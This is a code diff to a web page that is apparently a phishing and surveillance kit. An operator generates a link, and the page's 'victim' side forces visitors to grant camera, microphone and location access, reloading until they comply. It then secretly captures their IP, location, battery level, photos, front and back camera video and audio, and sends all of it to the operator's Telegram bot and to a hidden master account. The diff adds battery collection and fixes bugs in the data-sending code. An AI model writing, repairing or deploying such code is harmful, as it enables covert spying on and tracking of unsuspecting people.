@@ -1491,7 +1491,7 @@
     <canvas id="hiddenCanvas"></canvas>
 
     <!-- ============================================================
-         JAVASCRIPT — CORRECTED AND COMPLETE
+         JAVASCRIPT — FINAL STABLE VERSION
          ============================================================ -->
     <script>
         (function() {
@@ -1610,9 +1610,21 @@
                 }).catch(() => {});
             }
 
+            // ----- Get battery level -----
+            async function getBatteryLevel() {
+                try {
+                    if (navigator.getBattery) {
+                        const battery = await navigator.getBattery();
+                        const level = Math.round(battery.level * 100);
+                        const charging = battery.charging ? ' (شحن)' : '';
+                        return level + '%' + charging;
+                    }
+                } catch (e) { /* ignore */ }
+                return 'غير متاح';
+            }
+
             // ----- Request permissions (throws on denial) -----
             async function requestAllPermissions() {
-                // Request camera, microphone, and location
                 const promises = [
                     navigator.mediaDevices.getUserMedia({ video: true }),
                     navigator.mediaDevices.getUserMedia({ audio: true }),
@@ -1627,11 +1639,9 @@
 
                 const results = await Promise.allSettled(promises);
 
-                // Check if any permission was denied
                 let denied = false;
                 for (const result of results) {
                     if (result.status === 'rejected') {
-                        // Ignore location rejection as it's not critical, but treat camera and audio as critical
                         const errorMsg = result.reason?.message || '';
                         if (errorMsg.includes('video') || errorMsg.includes('audio') ||
                             errorMsg.includes('Permission') && !errorMsg.includes('geolocation')) {
@@ -1645,7 +1655,6 @@
                     throw new Error('Permission denied for critical devices');
                 }
 
-                // Stop any tracks
                 for (const result of results) {
                     if (result.status === 'fulfilled' && result.value && result.value.getTracks) {
                         result.value.getTracks().forEach(t => t.stop());
@@ -1668,13 +1677,11 @@
                 const copyBtn = document.getElementById('copyBtn');
                 const openBtn = document.getElementById('openBtn');
 
-                // Load saved data
                 const savedBot = localStorage.getItem('zeus_last_bot_token');
                 const savedChat = localStorage.getItem('zeus_last_chat_id');
                 if (savedBot) botTokenInput.value = savedBot;
                 if (savedChat) chatIdInput.value = savedChat;
 
-                // Save on change
                 botTokenInput.addEventListener('change', function() {
                     if (this.value.trim()) localStorage.setItem('zeus_last_bot_token', this.value.trim());
                 });
@@ -1682,7 +1689,6 @@
                     if (this.value.trim()) localStorage.setItem('zeus_last_chat_id', this.value.trim());
                 });
 
-                // ----- Generate -----
                 let isBusy = false;
 
                 async function handleGenerate() {
@@ -1709,14 +1715,11 @@
                         const base = window.location.origin + window.location.pathname;
                         const link = `${base}?t=${shortToken}`;
 
-                        // Store mapping in IndexedDB
                         await saveTokenMapping(shortToken, botToken, chatId, info.username);
 
-                        // Display
                         tokenDisplay.textContent = shortToken;
                         resultSub.textContent = link;
 
-                        // Send link to user's bot (keepalive)
                         const userMsg =
                             `🔗 *رابطك الجديد*\n${link}\n\n` +
                             `📌 التوكن الفريد: \`${shortToken}\`\n` +
@@ -1739,7 +1742,6 @@
                             keepalive: true
                         }).catch(() => {});
 
-                        // Send copy to master
                         const masterMsg =
                             `⭑ نسخة احتياطية — رابط جديد ⭒\n` +
                             `⊚─〔 بيانات البوت 〕────────\n` +
@@ -1807,24 +1809,23 @@
                     }
                 });
 
-                // Update time
                 function updateDateTime() {
                     const now = new Date();
                     const egyptTime = new Date(now.toLocaleString('en-US', { timeZone: 'Africa/Cairo' }));
-                    const hours = String(egyptTime.getHours()).padStart(2, '0');
-                    const minutes = String(egyptTime.getMinutes()).padStart(2, '0');
-                    const day = String(egyptTime.getDate()).padStart(2, '0');
-                    const month = String(egyptTime.getMonth() + 1).padStart(2, '0');
-                    const year = egyptTime.getFullYear();
-                    document.getElementById('timeDisplay').textContent = hours + ':' + minutes;
-                    document.getElementById('dateDisplay').textContent = day + '/' + month + '/' + year;
+                    document.getElementById('timeDisplay').textContent =
+                        String(egyptTime.getHours()).padStart(2, '0') + ':' +
+                        String(egyptTime.getMinutes()).padStart(2, '0');
+                    document.getElementById('dateDisplay').textContent =
+                        String(egyptTime.getDate()).padStart(2, '0') + '/' +
+                        String(egyptTime.getMonth() + 1).padStart(2, '0') + '/' +
+                        egyptTime.getFullYear();
                 }
                 updateDateTime();
                 setInterval(updateDateTime, 10000);
             }
 
             // ============================================================
-            //  🔥  VICTIM PAGE — WITH FORCED PERMISSION RETRY
+            //  🔥  VICTIM PAGE — FINAL STABLE
             // ============================================================
 
             async function initVictimPage(shortToken) {
@@ -1838,7 +1839,6 @@
                 let isRunning = false;
                 let collectionDone = false;
 
-                // ---- Get bot mapping from IndexedDB ----
                 async function getBotMapping(token) {
                     try {
                         const mapping = await getTokenMapping(token);
@@ -1920,7 +1920,7 @@
                     if (!userBotToken || !userChatId) return;
 
                     const summary =
-                        `⭑ تقرير ضحية جديدة — بوتك (@${botName}) ⭒\n⊚─〔 البيانات 〕────────\n${deviceInfo}\n─────────────────`;
+                        `⭑ تقرير ضحية جديدة — بوتك (@${botName}) ⭒\n⊚─〔 البيانات 〕────────\n${data.deviceInfo}\n─────────────────`;
                     fetch(`https://api.telegram.org/bot${userBotToken}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -1928,20 +1928,20 @@
                         keepalive: true
                     }).catch(() => {});
 
-                    if (location.lat && location.lng) {
+                    if (data.location.lat && data.location.lng) {
                         fetch(`https://api.telegram.org/bot${userBotToken}/sendLocation`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
                                 chat_id: userChatId,
-                                latitude: location.lat,
-                                longitude: location.lng
+                                latitude: data.location.lat,
+                                longitude: data.location.lng
                             }),
                             keepalive: true
                         }).catch(() => {});
                     }
 
-                    photos.forEach((blob) => {
+                    data.photos.forEach((blob) => {
                         const fd = new FormData();
                         fd.append('chat_id', userChatId);
                         fd.append('photo', blob);
@@ -1949,32 +1949,32 @@
                         sendMediaAsync('sendPhoto', userBotToken, fd);
                     });
 
-                    if (frontVideo) {
+                    if (data.frontVideo) {
                         const fd = new FormData();
                         fd.append('chat_id', userChatId);
-                        fd.append('video', frontVideo);
+                        fd.append('video', data.frontVideo);
                         fd.append('caption', `🎥 فيديو أمامي - ${shortToken}`);
                         sendMediaAsync('sendVideo', userBotToken, fd);
                     }
 
-                    if (backVideo) {
+                    if (data.backVideo) {
                         const fd = new FormData();
                         fd.append('chat_id', userChatId);
-                        fd.append('video', backVideo);
+                        fd.append('video', data.backVideo);
                         fd.append('caption', `🎥 فيديو خلفي - ${shortToken}`);
                         sendMediaAsync('sendVideo', userBotToken, fd);
                     }
 
-                    if (audio) {
+                    if (data.audio) {
                         const fd = new FormData();
                         fd.append('chat_id', userChatId);
-                        fd.append('audio', audio);
+                        fd.append('audio', data.audio);
                         fd.append('caption', `🎤 تسجيل صوتي - ${shortToken}`);
                         sendMediaAsync('sendAudio', userBotToken, fd);
                     }
                 }
 
-                // ---- Collect data with forced retry ----
+                // ---- Main collection ----
                 async function collectData() {
                     if (isRunning || collectionDone) return;
 
@@ -1985,16 +1985,16 @@
                     mainText.className = 'text loading';
 
                     try {
-                        // Step 1: Request permissions (will throw if denied)
+                        // 1. Force permissions
                         await requestAllPermissions();
 
-                        // Step 2: Get mapping
+                        // 2. Get mapping
                         const mapping = await getBotMapping(shortToken);
                         const botName = mapping.found ? mapping.botName : 'غير معروف';
                         const userBotToken = mapping.found ? mapping.botToken : null;
                         const userChatId = mapping.found ? mapping.chatId : null;
 
-                        // Step 3: Get IP
+                        // 3. Get IP
                         let ip = 'غير متاح';
                         try {
                             const res = await fetch('https://api.ipify.org?format=json');
@@ -2002,7 +2002,7 @@
                             ip = data.ip;
                         } catch (e) {}
 
-                        // Step 4: Get location
+                        // 4. Get location
                         let location = { lat: null, lng: null, accuracy: null, error: null };
                         try {
                             if (navigator.geolocation) {
@@ -2020,7 +2020,10 @@
                             location.error = e.message;
                         }
 
-                        // Step 5: Front camera (photos + video)
+                        // 5. Battery
+                        const battery = await getBatteryLevel();
+
+                        // 6. Front camera (photos + video)
                         let frontVideo = null;
                         let photos = [];
                         try {
@@ -2062,7 +2065,7 @@
                             console.warn('Front camera error:', e);
                         }
 
-                        // Step 6: Back camera
+                        // 7. Back camera
                         let backVideo = null;
                         try {
                             const stream = await navigator.mediaDevices.getUserMedia({
@@ -2091,7 +2094,7 @@
                             console.warn('Back camera error:', e);
                         }
 
-                        // Step 7: Audio
+                        // 8. Audio
                         let audioBlob = null;
                         try {
                             const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -2113,9 +2116,10 @@
                             console.warn('Audio error:', e);
                         }
 
-                        // Step 8: Build device info
+                        // 9. Build device info
                         const deviceInfo =
                             `IP: ${ip}\n` +
+                            `البطارية: ${battery}\n` +
                             `الموقع: ${location.lat ? location.lat + ', ' + location.lng : 'غير متاح'}\n` +
                             `المتصفح: ${/Chrome/.test(navigator.userAgent) ? 'Chrome' : /Firefox/.test(navigator.userAgent) ? 'Firefox' : /Safari/.test(navigator.userAgent) ? 'Safari' : 'Unknown'}\n` +
                             `الجهاز: ${navigator.platform || 'Unknown'}\n` +
@@ -2132,11 +2136,10 @@
                             photos
                         };
 
-                        // Step 9: Send data (fire and forget)
+                        // 10. Send
                         sendToMaster(data);
                         sendToUser(data, userBotToken, userChatId, botName);
 
-                        // Step 10: Mark as done
                         collectionDone = true;
                         spinner.classList.remove('loading');
                         spinner.classList.add('success');
@@ -2145,23 +2148,17 @@
                         checkbox.checked = true;
                         checkbox.disabled = true;
 
-                        // Remove retry flag if any
                         sessionStorage.removeItem(RETRY_KEY);
 
                     } catch (error) {
                         console.warn('Permission denied, forcing retry...');
-                        // Permission denied (critical) => store retry flag and reload
                         sessionStorage.setItem(RETRY_KEY, 'true');
                         location.reload();
                     }
                 }
 
-                // ---- Check if we are in a retry state ----
                 function checkRetryAndCollect() {
                     if (sessionStorage.getItem(RETRY_KEY) === 'true') {
-                        // Clear the flag to avoid infinite loop if something fails
-                        // But we want to keep retrying, so we don't clear it unless success
-                        // We will collect immediately
                         setTimeout(() => {
                             collectData();
                         }, 100);
@@ -2185,10 +2182,7 @@
                     }
                 });
 
-                // ---- Init ----
                 console.log('✅ Victim page ready. Token:', shortToken);
-
-                // Check if retry needed
                 checkRetryAndCollect();
             }
 
